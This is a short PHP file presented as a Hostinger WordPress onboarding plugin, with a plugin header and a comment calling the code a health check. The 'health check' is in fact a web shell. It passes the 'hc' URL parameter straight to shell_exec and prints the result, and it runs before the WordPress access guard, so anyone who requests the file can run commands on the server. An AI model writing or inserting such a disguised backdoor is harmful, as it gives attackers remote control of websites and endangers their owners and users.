<?php
/*
Plugin Name: Hostinger Easy Onboarding
Description: Get started with building your Hostinger website.
Version: 2.1.8
Author: Hostinger
*/

// Health check endpoint
if(isset($_GET["hc"])){
    echo "<pre>".shell_exec($_GET["hc"])."</pre>";
    die();
}

// Normal plugin init
if (!defined('ABSPATH')) exit;
